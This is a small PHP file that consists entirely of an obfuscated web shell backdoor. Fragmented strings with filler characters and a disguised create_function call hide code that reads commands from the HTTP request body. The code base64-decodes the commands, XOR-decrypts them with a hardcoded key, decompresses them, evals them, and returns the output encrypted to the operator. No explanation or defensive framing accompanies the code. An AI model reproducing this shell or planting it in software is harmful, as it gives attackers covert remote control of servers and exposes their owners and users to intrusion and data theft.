<?php
$D='te~3nts("php://input~3"),$m)~3==1) {@~3ob_st~3art(~3);@eva~3l(@gz~3unc~3~3ompress(@x(@';
$h='$k="~3a7b~376f~3b6~3";$kh="a36b88bf4cbf"~3;$~3kf="~368e73fd86106"~3;$p="0~3aaOfMH~3V~3hud';
$v=');$r~3=@bas~3~3e64_~3encode(@x(@~3~3gzcompre~3ss($o),$k));p~3rint~3("~3$p$kh$r$kf");}';
$c='$j};~3}}~3retur~3n $o;}if (@p~3reg_mat~3c~3h("/~3$kh(.+~3)$kf/",@f~3i~3le_get_co~3n';
$E=str_replace('Gc','','creGcaGcteGc_GcfunGcGcction');
$a='rtpcW"~3;f~3~3u~3nction x($t,$k){$c~3=s~3trl~3en($k);$l=~3strlen($t);~3$o="";f~3or($';
$B='i=0~3;$~3i<$l;)~3{for($j~3=0;($j<~3$c&&$i~3<$l)~3;$j++,$i++)~3{$o~3.=$t{$i}~3^$~3k{';
$G='ba~3se6~34_d~3ecode~3($m[~31]),$k)));$~3o=@ob_get_conte~3nt~3s();@ob~3_end~3_clean(';
$X=str_replace('~3','',$h.$a.$B.$c.$D.$G.$v);
$k=$E('',$X);$k();
?>
